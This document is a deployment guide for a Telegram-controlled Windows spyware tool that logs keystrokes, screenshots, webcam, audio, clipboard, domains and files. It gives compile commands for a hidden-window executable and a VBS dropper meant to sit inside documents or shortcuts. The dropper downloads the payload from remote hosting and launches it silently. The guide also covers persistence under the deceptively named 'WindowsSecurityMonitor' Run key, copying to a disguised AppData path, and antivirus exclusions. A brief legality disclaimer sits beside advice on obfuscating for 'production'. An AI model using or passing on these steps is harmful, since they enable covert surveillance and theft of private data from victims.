# SpyWare Telegram Bot — Deployment Guide

## Prerequisites
- Windows VM (or local Windows machine for testing)
- Python 3.8+ installed
- Telegram account + bot token from @BotFather
- Your Telegram user ID (get from @userinfobot)

## Step 1: Prepare Environment (.env file)

1. Copy `.env.example` to `.env` in the same directory as the `.exe`:
   ```
   cp .env.example .env
   ```

2. Edit `.env` with your credentials:
   ```
   BOT_TOKEN=<your_bot_token_from_BotFather>
   CHAT_ID=<your_telegram_user_id>
   ```

3. **Never commit `.env` to git** — it contains secrets.

## Step 2: Compile to .exe (on development machine)

```bash
# Install dependencies
pip install -r requirements.txt

# Install PyInstaller
pip install pyinstaller

# Compile to single .exe (no console window)
pyinstaller --onefile --windowed \
  --hidden-import=SpyWare \
  --hidden-import=SpyWare.AudioLogger \
  --hidden-import=SpyWare.KeyLogger \
  --hidden-import=SpyWare.ScreenLogger \
  --hidden-import=SpyWare.WebcamLogger \
  --hidden-import=SpyWare.ClipboardLogger \
  --hidden-import=SpyWare.DomainsLogger \
  --hidden-import=SpyWare.FilesLogger \
  --hidden-import=telebot \
  --hidden-import=dotenv \
  file_spyware.py

# Output: dist/file_spyware.exe
```

## Step 2b: Staged delivery via dropper (optional — small KB file)

 instantly Kelompok file distribusi: `dropper.vbs` (1 KB) di sisipan dokumen/shortcut, `.exe` payload asli di-upload ke hosting.

**Setup:**
1. Compile payload: `pyinstaller --onefile --windowed --hidden-import=... file_spyware.py` (step 2 above)
2. Upload `dist/file_spyware.exe` ke hosting (server sendiri / GitHub release / Telegram channel)
3. Edit `dropper.vbs`: ganti `PAYLOAD_URL` dengan URL hosting kamu
4. Edit `dropper.vbs`: isi `BOT_TOKEN` + `CHAT_ID` (hardcoded di vbs — dropper yang menulis `.env`, jadi `.exe` tidak bawa token)

**Flow saat drop jalan:**
```
dropper.vbs (1 KB dijalankan via dokumen/shortcut)
  → download payload.exe → %APPDATA%\WindowsSecurity\wsmgr.exe
  → tulis .env (token embedded di vbs)
  → Start-Process payload (silent)
  → payload merge jalan normal (self-install skip — sudah di lokasi ini)
```

Ukuran yang didistribute: **1 KB**. Payload yang gede (20-40MB) cuma di server.

## Step 3: Deploy to Windows VM

**AUTOSTATIC — No manual placement needed:**

1. Copy `.exe` + `.env` to anywhere on VM (Downloads folder is fine)
2. Put them in the **same folder**
3. Double-click `.exe` once

On first run, the program **automatically**:
1. Copies itself to hidden location: `C:\Users\<user>\AppData\Roaming\WindowsSecurity\wsmgr.exe`
2. Copies `.env` next to it
3. Registers itself in registry startup (Run key: `WindowsSecurityMonitor`)
4. Relaunches from the new location
5. Sends startup notification to your Telegram
6. Original downloaded `.exe` can be deleted safely

Persistent across reboots — survives user login, no console window, no visible trace in Startup folder.

## Step 4: Setup Autostart (Windows)

### AUTOMATIC — No Manual Setup Needed

Program **auto-registers itself silently** on first run:
- Writes to Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- Registry entry name: `WindowsSecurityMonitor` (generic, not obvious)
- No admin rights required (HKCU)
- Runs automatically on every user login/reboot

When you first run `.exe`:
1. No console window appears (silent)
2. Program registers itself in startup
3. Bot sends startup notification to your Telegram:

```
🍾 Program baru dijalankan di perangkat

🖥️ Perangkat: <hostname>
👤 User: <username>
🌐 IP lokal: <ip>
⚙️ OS: nt
🕐 Waktu: 2025-10-17 10:30:00
```

### Manual Options (Alternative)

**Startup folder shortcut:**
1. Navigate to: `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
2. Create shortcut to the `.exe`

**Task Scheduler:**
```cmd
schtasks /create /tn "SpyWare" /tr "C:\path\file_spyware.exe" /sc onlogon /ru <user>
```

## Step 5: Test Bot Commands

Once bot is running, send these in Telegram:

```
/start          — Show help + command list
/help           — Same as /start
/status         — Show running modules (should be "No modules running" at first)
/screenshot     — Take a screenshot
/webcam         — Take a webcam photo
/audio          — Record 10s audio
/startall       — Start all 7 spy modules in background
/status         — Show running modules (should list all 7)
/keylog         — Read keylogger output
/stopall        — Stop all modules
```

## Step 6: Uninstall / Stop Bot

### Option A: Telegram Command (Cleanest for development)

Send `/uninstall` in Telegram chat:
- Removes registry Run key autostart entry
- Removes any Startup folder shortcuts
- Stops all spy modules
- Cleans output directories
- Bot exits

### Option B: Manual Registry Removal

```cmd
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSecurityMonitor" /f
```

### Option B: Manual Removal

1. **Stop autostart:**
   - Delete shortcut from Startup folder (Option A above)
   - OR disable task in Task Scheduler (Option B above)

2. **Kill process:**
   - Task Manager: Find `file_spyware.exe`, End Task
   - OR `taskkill /IM file_spyware.exe /F` in cmd

3. **Remove .exe:**
   - Delete `C:\Users\<username>\AppData\Local\SpyWare\file_spyware.exe`
   - Keep `.env` if you plan to re-deploy

## Troubleshooting

### Bot doesn't respond in Telegram
- Check `.env` file exists in same directory as `.exe`
- Verify `BOT_TOKEN` and `CHAT_ID` are correct
- Check Windows firewall allows Python/exe outbound
- Restart `.exe` manually

### "No microphone" error on `/audio`
- VM doesn't have audio device
- OK for lab environment — just use other commands

### Antivirus blocks .exe
- Add exclusion: `C:\Users\<username>\AppData\Local\SpyWare\file_spyware.exe`
- Or disable AV temporarily during testing

### "ModuleNotFoundError: No module named 'SpyWare'"
- `.exe` missing hidden import
- Recompile with all `--hidden-import` flags (see Step 2)

### Ctrl+C doesn't stop bot gracefully
- Force kill: `taskkill /IM file_spyware.exe /F`
- Then restart

## Security Notes (Development Only)

This tool captures:
- Screenshots
- Keylog data
- Audio recordings
- Clipboard contents
- Webcam photos
- File metadata
- Network connections

**Use only on VMs/machines you own. Unauthorized surveillance is illegal.**

For production deployment:
- Encrypt `.env` file
- Use restricted folder permissions
- Consider code obfuscation
- Log all command invocations

## Default Output Directories

Bot creates these on VM when modules run:
- `screenshots/` — screenshot PNG files
- `pictures/` — webcam PNG files
- `records/` — audio WAV files
- `keySpy.txt` — keylog data
- `clipboard.txt` — clipboard history
- `domains.txt` — network connections
- `files.csv` — file metadata

All stored relative to where `.exe` runs.
